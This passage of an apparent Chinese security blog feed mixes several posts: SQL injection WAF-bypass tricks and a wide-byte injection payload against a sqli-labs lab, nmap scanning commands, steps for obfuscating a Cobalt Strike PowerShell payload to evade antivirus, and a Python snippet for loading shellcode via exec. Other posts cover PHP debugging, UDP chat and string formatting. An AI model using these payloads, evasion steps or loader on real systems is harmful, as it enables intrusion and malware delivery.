<h4 id="substr-mid"><a href="#substr-mid" class="headerlink" title="substr/mid"></a>substr/mid</h4><p>绕过方法: from x for y</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">substr(<span class="string">&#x27;password&#x27;</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line"><span class="operator">=</span>substr(<span class="string">&#x27;password&#x27;</span> <span class="keyword">from</span> <span class="number">5</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">mid(<span class="string">&#x27;password&#x27;</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line"><span class="operator">=</span>mid(<span class="string">&#x27;password&#x27;</span> <span class="keyword">from</span> <span class="number">5</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>



<h3 id="比较符-lt-gt"><a href="#比较符-lt-gt" class="headerlink" title="比较符 &lt; &gt;"></a>比较符 &lt; &gt;</h3><h4 id="greatest函数绕过"><a href="#greatest函数绕过" class="headerlink" title="greatest函数绕过"></a>greatest函数绕过</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">greatest(a,b)，返回a和b中较大的那个数</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>猜解user()第一个字符的ascii码是否小于等于150时<br>ascii(mid(user(),1,1)) &lt;= 150<br>=greatest(ascii(mid(user(),1,1)), 150)=150;</p>
<h4 id="-2"><a href="#-2" class="headerlink" title="=, !="></a>=, !=</h4><p>枚举爆破绕过</p>
<h3 id="等号"><a href="#等号" class="headerlink" title="等号   ="></a>等号   =</h3><pre><code>SELECT mid(USER(),1,1) = &quot;r&quot;
SELECT mid(USER(),1,1) like &quot;r&quot;
SELECT mid(USER(),1,1) in (&quot;r&quot;)
</code></pre>
<h3 id="单引号-‘"><a href="#单引号-‘" class="headerlink" title="单引号  ‘"></a>单引号  ‘</h3><p>在比较的时候过滤了’<br>用hex编码绕过<br>    防护：SELECT mid(USER(),1,1)=’r’<br>    绕过：SELECT mid(USER(),1,1)=unhex(72)</p>
<p>这样子这个只能hex一个字符，多了就不行，所以不建议用这个<br>直接0x就行了<br>    防护：SELECT mid(USER(),1,4)=”root”<br>    绕过：SELECT mid(USER(),1,4)=0x726f6f74</p>
<h3 id="括号-（-）"><a href="#括号-（-）" class="headerlink" title="括号 （  ）"></a>括号 （  ）</h3><h4 id="左括号过滤"><a href="#左括号过滤" class="headerlink" title="左括号过滤"></a>左括号过滤</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"><span class="operator">%</span>u0028 <span class="operator">%</span>uff08</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">28</span> <span class="operator">%</span>c0<span class="operator">%</span>a8</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a8</span><br></pre></td></tr></table></figure>

<h4 id="右括号过滤"><a href="#右括号过滤" class="headerlink" title="右括号过滤"></a>右括号过滤</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"><span class="operator">%</span>u0029 <span class="operator">%</span>uff09</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">29</span> <span class="operator">%</span>c0<span class="operator">%</span>a9</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a9</span><br></pre></td></tr></table></figure>




<h2 id="针对关键字限制的绕过"><a href="#针对关键字限制的绕过" class="headerlink" title="针对关键字限制的绕过"></a>针对关键字限制的绕过</h2><h3 id="or-and"><a href="#or-and" class="headerlink" title="or and"></a>or and</h3><p>对于or 和 and，可以用 || 和  &amp;&amp;</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="operator">||</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="number">1</span> <span class="operator">&amp;&amp;</span> a <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><p>逻辑绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>))</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> lpad(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> <span class="string">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>


<h3 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h3><p>逻辑绕过</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> unhex(<span class="number">61</span>)</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) #十进制的<span class="number">11</span>转化为十六进制，并小写。</span><br></pre></td></tr></table></figure>



<h3 id="union-select"><a href="#union-select" class="headerlink" title="union\select"></a>union\select</h3><p>逻辑绕过<br>例：<br>过滤代码 union select user,password from users<br>绕过方式 1 &amp;&amp; (select user from users where userid=1)=’admin’</p>
<p>十六进制字符绕过<br>select ——&gt; selec\x74<br>union——&gt;unio\x6e</p>
<h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3><p>逻辑绕过<br>过滤代码 1 &amp;&amp; (select user from users where user_id = 1) = ‘admin’<br>绕过方式 1 &amp;&amp; (select user from users limit 1) = ‘admin’</p>
<h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>逻辑绕过<br>过滤代码 1 &amp;&amp; (select user from users limit 1) = ‘admin’<br>绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = ‘admin’#user_id聚合中user_id为1的user为admin</p>
<h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3><p>逻辑绕过<br>过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = ‘admin’<br>绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</p>
<h2 id="绕过addslashes"><a href="#绕过addslashes" class="headerlink" title="绕过addslashes"></a>绕过addslashes</h2><p>addslashes函数使用反斜线引用字符串，返回一个字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）<br>在mysql使用了gbk编码的情况下，可以用宽字节注入绕过addslashes<br>原理：在使用GBK编码后，他认为两个字节代表一个汉字。那如何判断一个字符是不是中文，当第一个字节ascii码大于128，他就会认为这里两个字符是中文，所以%81和后面的  /（%5c)就会组合在一起，mysql会认为他们是一个字符，而这时候，/ 的转义作用就失效了。<br>128转换16进制是0x80，所以只要大于0x81就行</p>
<p>这里出问题的地方在于mysql，php已经尽职尽责了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-33&#x2F;?id&#x3D;-1&#39;union select 1,user(),3--+</span><br><span class="line">127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-33&#x2F;?id&#x3D;-1**%81**&#39;union select 1,user(),3--+</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;-1�\&#39;union select 1,user(),3</span><br></pre></td></tr></table></figure>


<h2 id="关键字内联绕所有"><a href="#关键字内联绕所有" class="headerlink" title="关键字内联绕所有"></a>关键字内联绕所有</h2><p>/<em>!union</em>/<br>/<em>!select</em>/</p>
]]></content>
  </entry>
  <entry>
    <title>nmap的简单使用</title>
    <url>/2019/07/20/nmap%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11219448.html">源地址：https://www.cnblogs.com/This-is-Y/p/11219448.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>主机探测</strong></p>
<p>1.扫描单个主机</p>
<p>nmap 192.168.1.2</p>
<p>2.扫描整个子网</p>
<p>nmap 192.168.1.1/24</p>
<p>3.扫描多个目标</p>
<p>nmap 192.168.1.1 192.168.1.1.5</p>
<p>4.扫描一个范围内的目标</p>
<p>nmap 192.168.1.1-100</p>
<p>5.如果有一个全是ip地址的txt文件，这个文件在你的nmap目录下，则可以这样子操作</p>
<p>nmap -iL 这个文件的名字.txt </p>
<p>6.如果想看到你扫描的所有主机的列表</p>
<p>nmap -sL 192.168.0.1/24</p>
<p>7.扫描时略过某些ip或文件，加上-exclude</p>
<p>nmap 192.168.1.1/24 -exclude 192.168.1.5</p>
<p>nmap 一个文件.txt -exclude 想要略过的文件.txt</p>
<p> </p>
<p><strong>端口扫描</strong></p>
<p>1.常用命令</p>
<p>namp -F -sT -v namp.org</p>
<p>　　-F:扫描100个最有可能开放的端口</p>
<p>　　-v:获取扫描的信息</p>
<p>　　-sT:采用的时TCP扫描，不写也可以，默认为TCP扫描</p>
<p>　　-p:指定要扫描的端口（如namp -p80，22，23 192.168.6.1）</p>
<p>　　较为实用的：nmap -iL 1.txt -p 1-65535 -Pn -sS</p>
<p>       扫描一个文件里的ip的65535个端口 要采取隐蔽式扫描 ，跳过主机存活发现 ，半连接式扫描</p>
<p>　　在使用nmap时，先用masscan扫存活端口 再用nmap识别端口服务。masscan -iL 1.txt -p 1-65535 -oJ masscan.json –rate 2000     提取出存活的端口，再用nmap扫描端口服务</p>
<p>端口状态分为6种：</p>
<p>Open：端口处于开放状态</p>
<p>Closed：端口处于关闭状态</p>
<p>Filtered（过滤的）：由于报文无法到达指定的端口，nmap不能够决定端口的开放状态，这主要是由于网络或者主机安装了一些防火墙所导致的。当nmap收到icmp报文主机不可达报文</p>
<p>Unfiltered（未被过滤的），当nmap不能确定端口是否开放的时候所打上的状态，这种状态和filtered的区别在于：unfiltered的端口能被nmap访问，但是nmap根据返回的报文无法确定端口的开放状态，而filtered的端口直接就没就没能够被nmap访问。端口被定义为Unfilterd只会发生在TCP ack扫描类型时当返回RST的报文。而端口被定义为filtered 状态的原因是是报文被防火墙设备，路由器规则，或者防火墙软件拦截，无法送达到端口，这通常表现为发送NMAP的主机收到ICMP报错报文，如：TYPE为3，code为13的报文</p>
<p>Open|filtered状态，这种状态主要是nmap无法区别端口处于open状态还是filtered状态。这种状态只会出现在open端口对报文不做回应的扫描类型中</p>
<p>Closed|filtered状态，这种状态主要出现在nmap无法区分端口处于closed还是filtered时</p>
<p>参考：<a class="link" href="https://blog.csdn.net/m0_37268841/article/details/80234365">https://blog.csdn.net/m0_37268841/article/details/80234365<i class="fas fa-external-link-alt"></i></a></p>
<p>扫描方式</p>
<p>TCP（-sT）和SYN（-sS）</p>
<p>　　-sS  　　</p>
<p>　　优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高  　　</p>
<p>　　缺点：它需要root/administrator权限执行</p>
<p> </p>
<p>-sT</p>
<p>优点：你勿需root权限。普通用户也可以使用。  　　</p>
<p>缺点：这种扫描很容易被检测到，在目标主机的日志中会记录大批的连接请求以及错误信息，由于它要完成3次握手，效率低，速度慢，建议使用-sS</p>
<p>　　2.UDP ping探测主机：</p>
<p>　　　　nmap -PU 192.168.1.0/24</p>
<p>　　3.服务器版本探测</p>
<p>　　　　nmap -sV 192.168.1.1</p>
<p>　　4.精准确认端口上运行的服务</p>
<p>　　　　nmap -sV –script unusual -port 192.168.1.1</p>
<p>　　5.探测主机操作系统</p>
<p>　　　　nmap -O 192.168.1.19</p>
<p>　　　　nmap -A 192.168.1.19</p>
<p>　　6.导出扫描结果</p>
<p>　　　　 用关键字-oN和-oX</p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>另外：</p>
<p>使用这个命令，可以抵御一次攻击</p>
<p>nmap -sT -A localhost           <img src="1503868-20190720205647681-1115143578.png" alt></p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>powershell 免杀 invoke-obfuscation</title>
    <url>/2020/10/04/powershell%20%E5%85%8D%E6%9D%80%20invoke-obfuscation-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13767546.html">源地址：https://www.cnblogs.com/This-is-Y/p/13767546.html<i class="fas fa-external-link-alt"></i></a></p>
<p>github地址：<a class="link" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation<i class="fas fa-external-link-alt"></i></a></p>
<p> </p>
<p>使用的CS生成的ps1文件</p>
<p>Attacks-&gt;Payload Generator-&gt;powershell</p>
<p> </p>
<p> </p>
<p>安装方法这里跳过</p>
<p>启动：</p>
<p>跳转到文件目录：　cd ‘E:\Safe_Tool\webshell\Invoke-Obfuscation-master&#39; </p>
<p>导入模块：　　　　Import-Module .\Invoke-Obfuscation.psd1</p>
<p>启动：　　　　　　Invoke-Obfuscation</p>
<p>设置需要操作的ps1文件</p>
<p> set scriptpath  C:\Users\This_is_Y\Desktop\2.ps1  #设置脚本位置</p>
<img src="1503868-20201003220554355-1304859490.png" alt loading="lazy">

<p>英语不好，翻译了一下</p>
<p>选择以下选项之一:</p>
<p>令牌        混淆PowerShell命令令牌<br> AST        混淆PowerShell Ast节点(PS3.0+)<br>字符串    将整个命令混淆为字符串<br>编码        通过编码混淆整个命令<br>压缩        将整个命令转换为一行程序并进行压缩<br>发射器    混淆命令参数w /发射器技术(结束)运行一次    </p>
<p>需要那个就输入哪个的英文（不区分大小写）</p>
<p><strong>token</strong></p>
<p>进入到token选项后，又会给一些选项</p>
<img src="1503868-20201003220734822-1525602381.png" alt loading="lazy">

<p>令牌\字符串\    混淆字符串令牌(建议先运行)<br>令牌\命令\    混淆命令令牌<br>令牌\参数\    混淆参数令牌<br>令牌\成员\    混淆成员令牌<br>令牌\变量\    混淆变量令牌<br>令牌\类型\    混淆类型令牌<br>标记\注释\    删除所有注释标记<br>令牌\空格\    插入随机空格(建议最后运行)<br>令牌\ALL \    从上面选择所有选项(随机顺序)</p>
<p> </p>
<p>这里我图方便直接一个alll了</p>
<p>输出加密后的文件</p>
<p>直接输出到当前目录下：out 2_token_all.ps1</p>
<p>也可以自己控制输出文件位置</p>
<p>（实测过火绒，2020.10.03）</p>
<p>virustotal.com上查杀率为1/59</p>
<img src="1503868-20201004161127806-2036731935.png" width="800" loading="lazy">

<p> </p>
<p> <strong>AST：</strong></p>
<p> <img src="1503868-20201005102704471-449225942.png" alt loading="lazy"></p>
<p>机翻</p>
<p>AST\NamedAttributeArgumentAst　　模糊NamedAttributeArgumentAst节点<br><br>AST\ParamBlockAst　　　　　　  模糊paramblock节点<br><br>AST\ScriptBlockAst　　　　　　　混淆ScriptBlockAst节点<br><br>AST\AttributeAst　　　　　　　　 模糊AttributeAst节点<br><br>AST\BinaryExpressionAst　　　　 模糊BinaryExpressionAst节点<br><br>AST\HashtableAst　　　　　　　  模糊HashtableAst节点<br><br>AST\CommandAst　　　　　　　  模糊CommandAst节点<br><br>AST\AssignmentStatementAst　　 模糊AssignmentStatementAst节点<br><br>AST\TypeExpressionAst　　　　    混淆TypeExpressionAst节点<br><br>AST\TypeConstraintAst　　　　　  混淆TypeConstraintAst节点<br><br>AST\ALL　　　　　　　　　　　　从上面选择所有选项</p>
<p> 不太懂AST是什么，但是如果只看结果</p>
<p>这一类的混淆似乎不太好，用ALL测试一下，运行，火绒依然报毒</p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>php代码审计入门</title>
    <url>/2021/07/27/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8-This-is-Y/</url>
    <content><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>环境用的phpstorm+phpstudy2018+xdebug</p>
<h3 id="phpstudy2018"><a href="#phpstudy2018" class="headerlink" title="phpstudy2018"></a>phpstudy2018</h3><p>扩展里打开Xdebug<br><img src="image-20210727194225989.png" alt="image-20210727194225989"></p>
<p>然后打开php的配置文件php.ini,拉到最下面，添加配置信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xdebug.profiler_output_dir&#x3D;&quot;E:\phpStudy\PHPTutorial\tmp\xdebug&quot;</span><br><span class="line">xdebug.trace_output_dir&#x3D;&quot;E:\phpStudy\PHPTutorial\tmp\xdebug&quot;</span><br><span class="line">zend_extension&#x3D;&quot;E:\phpStudy\PHPTutorial\php\php-5.4.45\ext\php_xdebug.dll&quot;</span><br><span class="line">xdebug.remote_log &#x3D; &quot;E:\phpStudy\PHPTutorial\php\php-5.4.45\ext\xdebug\xdebug.log&quot;</span><br><span class="line">xdebug.remote_enable &#x3D; On</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line">xdebug.remote_port&#x3D;9000</span><br><span class="line">xdebug.remote_handler&#x3D;dbgp</span><br><span class="line">xdebug.idekey&#x3D;PHPSTORM</span><br></pre></td></tr></table></figure>
<p><img src="image-20210727194409268.png" alt="image-20210727194409268"><br>扩展文件xdebug.dll，phpstudy默认有，确定路径无误就行，idekey要确保是PHPSTORM,因为xdebug浏览器插件用的就是这个，端口9000，这个也是有用的。<br>如果配置好了，打开phpinfo，搜索xdebug应该可以看到这个，同时注意IDE Key 是PHPSTORM ，这个东西每次更新，都要重启apache或者nignx（可能）服务器，看不到变化的话，清除缓存或者换个浏览器。</p>
<p><img src="image-20210727194818897.png" alt="image-20210727194818897"></p>
<p>确定插件无误后，给要审计的cms配置一个域名，phpstudy其他选项菜单-&gt;站点域名管理<br><img src="image-20210727212106435.png" alt="image-20210727212106435"></p>
<p>再去host文件里加一条<br><code>127.0.0.1 www.bluecms.com</code><br><img src="image-20210727212314262.png" alt="image-20210727212314262"></p>
<p>可以ping一下域名，看看生效了没有，没有的话清空一下dns缓存<br><code>ipconfig /flushdns</code></p>
<p>当浏览器可以用域名访问到目标后，就可以开始配置phpstorm了</p>
<h3 id="phpstorm"><a href="#phpstorm" class="headerlink" title="phpstorm"></a>phpstorm</h3><p>设置-&gt;语言和框架-&gt;PHP，选择合适的php解释器<br><img src="image-20210727210520371.png" alt="image-20210727210520371"></p>
<p>点开php的二级设置，选择服务器，添加一个新服务器，主机写之前配置好的目标域名<br><img src="image-20210727214628860.png" alt="image-20210727214628860"></p>
<p>选择调试，选择xdebug的端口为9000，和之前php.ini里的对应<br><img src="image-20210727210630889.png" alt="image-20210727210630889"></p>
<p>点开调试的二级目录，选择DBGp代理，IDE键写PHPSTORM ，主机localhost，端口9000<br><img src="image-20210727211022795.png" alt="image-20210727211022795"></p>
<p>应用，确定。右上角添加配置，添加一个phpweb页面，服务器选刚刚配置的，起始url保持默认就行，一个*/*<br><img src="image-20210727214841825.png" alt="image-20210727214841825"></p>
<p>然后点击下面的验证，测试能不能正常工作<br><img src="image-20210727214927949.png" alt="image-20210727214927949"></p>
<p>正常<br>现在点击配置旁边的绿色启动按钮就应该会自动打开浏览器访问目标网站了</p>
<h3 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h3><p>在火狐浏览器的扩展里找到他，添加<br><img src="image-20210727212747070.png" alt="image-20210727212747070"></p>
<p>修改配置，选择phpstorm，这里就可以看到为什么之前的idekey要写PHPSTORM 了，就是为了要和这个插件这里对应。不然插件没法工作<br><img src="image-20210727212838148.png" alt="image-20210727212838148"></p>
<p>设置完成之后，phpstorm设置断点，开启监听。<br>打开网站，把xdebug插件的工作模式改为debug，然后和网站交互，搜索，刷新之类的，就可以在phpstorm监听到信息了，<img src="image-20210727213211148.png" alt="image-20210727213211148"><img src="image-20210727213225492.png" alt="image-20210727213225492"></p>
]]></content>
  </entry>
  <entry>
    <title>py3加载shellcode 字符型shellcode转为bytes</title>
    <url>/2021/10/21/py3%E5%8A%A0%E8%BD%BDshellcode-%E5%AD%97%E7%AC%A6%E5%9E%8Bshellcode%E8%BD%AC%E4%B8%BAbytes-This-is-Y/</url>
    <content><![CDATA[<p>这个东西我一定要记录一下，卡了我挺久的</p>
<p>py3加载来自 CS的py64的shellcode时，传入的shellcode需要时bytes类型的，直接写死在代码里还好，但是如果是想自己在程序跑起来时输入，就有点问题了，一般来说，str-&gt;bytes都用用的 encode()。比如说这样子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">b = s.encode()</span><br></pre></td></tr></table></figure>

<p>假如说整个代码是这样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="built_in">input</span>(<span class="string">&quot;shellcode&gt;&gt;&gt;&quot;</span>)</span><br><span class="line">shellcode = shellcode.encode()</span><br><span class="line">shellcodeloader(shellcode)</span><br></pre></td></tr></table></figure>

<p>这时候你会发现它根本没法工作，然后今天在这个老哥的源码里找到了解决方法，真滴牛批，长见识了<br><a class="link" href="https://github.com/iframepm/FuckAV/">https://github.com/iframepm/FuckAV/<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;shellcode=b&quot;&#x27;</span>+<span class="built_in">input</span>(<span class="string">&quot;shellcode&gt;&gt;&gt;&quot;</span>)+<span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">shellcodeloader(shellcode)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可能就编译器会加点波浪线啥的，但是shellcode是可以跑起来的</p>
<h2 id="10-30更新"><a href="#10-30更新" class="headerlink" title="10.30更新"></a>10.30更新</h2><p>刚刚发现这个操作如果写在函数里会失效，去查了一下<br><a class="link" href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c09/p23_executing_code_with_local_side_effects.html">https://python3-cookbook.readthedocs.io/zh_CN/latest/c09/p23_executing_code_with_local_side_effects.html<i class="fas fa-external-link-alt"></i></a><br>简单测试一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = <span class="string">&#x27;123&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>,shellcode)</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;shellcode = b&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(shellcode))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>():</span></span><br><span class="line">    shellcode = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;3&#x27;</span>,shellcode)</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&quot;shellcode = b&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(shellcode))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;4&#x27;</span>,shellcode)</span><br><span class="line">go()</span><br></pre></td></tr></table></figure>
<p>上面和下面的代码是完全一样的，但是结果完全不同<br><img src="image-20211030173126301.png" alt="image-20211030173126301"></p>
<p>可以看到在函数里的exec好像没有起到作用</p>
<h3 id="先说解决方法"><a href="#先说解决方法" class="headerlink" title="先说解决方法"></a>先说解决方法</h3><p>在exec前面加上loc = locals()，后面加上shellcode = loc[‘shellcode’]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>():</span></span><br><span class="line">    shellcode = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;3&#x27;</span>,shellcode)</span><br><span class="line">    loc = <span class="built_in">locals</span>()</span><br><span class="line">    <span class="built_in">exec</span>(<span class="string">&quot;shellcode = b&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(shellcode))</span><br><span class="line">    shellcode = loc[<span class="string">&#x27;shellcode&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;4&#x27;</span>,shellcode)</span><br><span class="line">go()</span><br></pre></td></tr></table></figure>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>++看了一圈发现没看明白，只知道是和局部变量，全局变量有关</p>
<p><strong>locals()</strong> 函数会以字典类型返回当前位置的全部局部变量。</p>
]]></content>
  </entry>
  <entry>
    <title>python UDP多线程通信，以及自己加的花里胡哨、乱七八糟的东西</title>
    <url>/2021/03/12/python%20UDP%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%B7%B1%E5%8A%A0%E7%9A%84%E8%8A%B1%E9%87%8C%E8%83%A1%E5%93%A8%E3%80%81%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E4%B8%9C%E8%A5%BF-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14526761.html">源地址：https://www.cnblogs.com/This-is-Y/p/14526761.html<i class="fas fa-external-link-alt"></i></a></p>
<p>简单的通信代码，发送，接收，转发，接收，发送。用python短短几行就可以解决</p>
<p> </p>
<p>服务器：</p>
<p> </p>
<p> 客户端：</p>
<p> </p>
<p> </p>
<p> 过程非常简单，开启服务器，然后打开客户端，连接到服务器。客户端发送一段数据给服务器，服务器把数据转发回给客户端，还可以多开几个客户端。</p>
<p>效果就是这样子</p>
<img src="1503868-20210312211031948-1625764453.png" width="1200" loading="lazy">

<p> </p>
<p> 但是肯定不行，客户端与客户端之间不能通信，然后就有了下面的代码，这是在网上找到的，我自己写的逻辑没这么清晰，所以就借用了一下这哥们的</p>
<p>博客地址：<a class="link" href="https://www.cnblogs.com/markjuruo/p/10101625.html">https://www.cnblogs.com/markjuruo/p/10101625.html<i class="fas fa-external-link-alt"></i></a></p>
<p>github：<a class="link" href="https://github.com/markjuruo/Python-UDP-Chating">https://github.com/markjuruo/Python-UDP-Chating<i class="fas fa-external-link-alt"></i></a></p>
<p>客户端（版权消息也都留着，可以去看看他的，思路清晰）</p>
<p> </p>
<p> 服务器</p>
<p> </p>
<p> 效果挺不错，比上面要好，相当于是一个聊天室一样的结构，但是用着用着发现问题了，退出会卡死，所以就想着自己再改一改，优化一下退出的代码。</p>
<p> </p>
<p>然后就是现在这版的代码，注释写得非常详细了。</p>
<p>首先，客户端是有两个线程，一个发送SEND，一个接收RECV。要关闭客户端的话，就要让两个线程都正常关闭，起初想用进程间的通信解决，queue队列，写着写着发现好像可以不用这么复杂。</p>
<p>关闭的主要流程是，用户输入一个特殊代码，告诉客户端准备退出，然后客户端发送一个请求退出的消息给服务器，然后结束掉SEND线程。</p>
<p>同时服务器接收到请求后，再单独发送一条消息给这个客户端，此时客户端的RECV线程中正在等待的recvfrom函数接收到这条消息。然后关闭RECV线程。</p>
<p>至此，两个线程都关闭，然后执行s.close()，关闭套接字，客户端程序退出</p>
<p>服务器的话就比较简单了，在所有的客户端都退出后，再选择是否退出就行了</p>
<p> </p>
<p>代码如下</p>
<p>服务器：</p>
<p> </p>
<p> </p>
<p> 客户端：</p>
<p> </p>
<p> 效果如下：</p>
<img src="1503868-20210312222127156-1641504848.png" width="1200" loading="lazy">

<p> 退出：</p>
<img src="1503868-20210312222219445-1902128098.png" width="1200" loading="lazy">

<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>python format() 格式化输出</title>
    <url>/2020/10/18/python%20format()%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13806255.html">源地址：https://www.cnblogs.com/This-is-Y/p/13806255.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>进制转换问题</strong></p>
<p>二进制-Binary-b</p>
<p>八进制-Octal-o</p>
<p>十进制-Decimal-d</p>
<p>十六进制-Hexadecimal-x</p>
<p>效果如图</p>
<img src="1503868-20201018092410558-702270383.png" alt>

<p> </p>
<p>代码👇</p>
<p> </p>
<p>位置匹配</p>
<p>效果</p>
<img src="1503868-20201018093842583-71552239.png" alt loading="lazy">

<p> </p>
<p>代码👇</p>
<p> 参考：<a class="link" href="https://www.cnblogs.com/fat39/p/7159881.html">https://www.cnblogs.com/fat39/p/7159881.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>python str.format 中文对齐的细节问题</title>
